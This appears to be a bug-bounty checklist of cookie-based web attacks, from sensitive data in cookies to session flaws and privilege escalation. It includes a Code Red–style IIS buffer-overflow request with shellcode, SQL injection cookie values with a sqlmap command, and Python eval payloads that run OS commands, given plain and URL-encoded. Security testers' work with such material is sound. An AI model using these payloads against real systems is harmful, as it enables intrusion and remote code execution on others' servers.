[ ] sensetive Data Stored in Cookies
```
check if anf pii or other sensitive infromation stored in  cookies this in fromation usually includes : email,sessionID, data of birth ,mobile address ,ssn ,etc.
```

[ ] cookie length violation 
leads to Buffer Overflow : A cookie length which is longer than profiled length can indicate that a buffer overflow attack attempt takes place. In a buffer overflow attack, the attacker will have to send very long strings that will generate the overflow, all of them generating this Violation.

```
GET  /default.ida?NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531 b%u53ff%u0078%u0000%u00=a
```

[ ] Arbitrary Cookie injection
```
try injecting some arbitrary cookies using attack such as CRLF injection ,
some times it can be used to escalate privilege or if the application malfunction, it can reveal sensitive infromation through stack traces
```

[ ] Mass Assignment
```
similar to the parameter poolution, however in this , attacker tried to inject multiple user ID in same user_id  parameter
```

[ ] Damial of service - cookie Bomb
```
forcing the server to process cookies larger than the resricted cookie size defined by the server may cause danial of service attack 

https://target.com/index.php?param1=xxxxxxxxxxxxxxxxxxxxxx

After input "xxxxxxxxxxxxxxxxxxxxxx" as a value of param1, check your cookies. If there is cookies the value is "xxxxxxxxxxxxxxxxxxxxxx" it means the website is vulnerable

References: [Hackerone #105363](https://hackerone.com/reports/105363)

```

[ ] SQL injection
```
How to inject the code in Cookies?
There are many HTTP interceptors and HTTP editors that can intercept the HTTP request before it is sent to the server. Then the tester can introduce his malicious SQL statement in the cookie field.

It’s like a get/post based SQL Injection, except that certain characters can’t be used. For example, ‘**;**‘ and ‘**,**‘ are typically treated as delimiters, so they end the injection if they aren’t URL-encoded.

Cookie : sessionId=xxxbad1fdc’ order by 1# (Normal)_
Cookie : sessionId=xxxbad1fdc’ order by 2# (Error)_

after error 
sqlmap -u "" --cookie="" -p "" --dbs
```

[ ] parameter pollution
```
1. Assume that cookie utilize a parameter called **user_id=** to rerieve some data
2. however , the application is not vulnerability to idor and change **user_id** to victim value dosnt help you 
3.attacker ,add an addition another  **user_id=** parameter value to rhe cookie with vuctim user ID LIke: **user_id=atacker&user_id=victim**
4. Three things can happen here:
- the application may retrieve data of victim data
- the application may retrieve data of victim data and attacker data
- the application is not retrieve data it is not vulnerability
```

[ ] Authentication Bybass (cookie are not avalid)
```
try accessing a protected resource by removing cookies
```

[ ] xss
```
assume that the value of the cookie parameter "name" is reflected in the application
change the "name" value to "xss payload"
```

[ ] Insufficient session management
```
1. session doesnt expire on logout 
2. long session expirey
3. session doesnt expire on password reset /change
4. concurrent session
```

[ ] privilege escalation
- horizontal
```
1.assume that the application uses mult-organization models
2.cookie are used wich organized user can access
3.alter the cookie in order to access some other application
```
- vertical
```
1.assume the cookie are used to determine the role of the user
2.alter the cookie in order to elevate the role of the user
```
- similarly
```
1.try if the flower users cookies can be used to access higher users function 
2.try if the cookie of organization 1 user van be used to access function of organizaion 2
```

[ ] sesion puzzing
```
when an application utilzes the same session variable for multiple purposes , this can abused by an attacker to trick the application and perform the action as an authenticated or privileged user
```



[ ] Exploiting Python Code Injection
this payload in cookie or contenttype or path or parameter

```python
eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))
```

[ ] OS command injection

```python
**eval(compile("""for x in range(1):\\n import os\\n os.popen(r'COMMAND').read()""",'','single'))**
```

```python
eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))
```

```python
**__import__('os').popen('COMMAND').read()**
```

[ ] URL encode some characters
```python
param=eval%28compile%28%27for%20x%20in%20range%281%29%3A%0A%20import%20time%0A%20time.sleep%2820%29%27%2C%27a%27%2C%27single%27%29%29
```

```python
param=eval%28compile%28%22%22%22for%20x%20in%20range%281%29%3A%5Cn%20import%20os%5Cn%20os.popen%28r%27COMMAND%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
```

```python
param=eval%28compile%28%22%22%22__import__%28%27os%27%29.popen%28r%27COMMAND%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
```

```python
param=__import__%28%27os%27%29.popen%28%27COMMAND%27%29.read%28%29
```

Example with one expression
```python
__import__('os').popen('COMMAND').read()
```

Example with multiple expressions, separated by commas
```python
str("-"*50),__import__('os').popen('COMMAND').read()
```
[ ] Insecure Deserialization
```
 if cookis are using serialized Objects ,try performing insecure Deserialization Checks.
 portswigger laps
```
[ ] Electronic Code Book                                                                                                                                   
[ ] Pickle Code Execution                                                                                                                                   
[ ] Cipher block chainin                                                                                                                                   
[ ] file inclusion                                                                                                                                         
[ ] IDOr                                                                                                                                                   
[ ] session fixation                                                                                                                                       
[ ] padding oracle attack                                                                                                                                   
[ ] jwt attack                                                                                                                                               
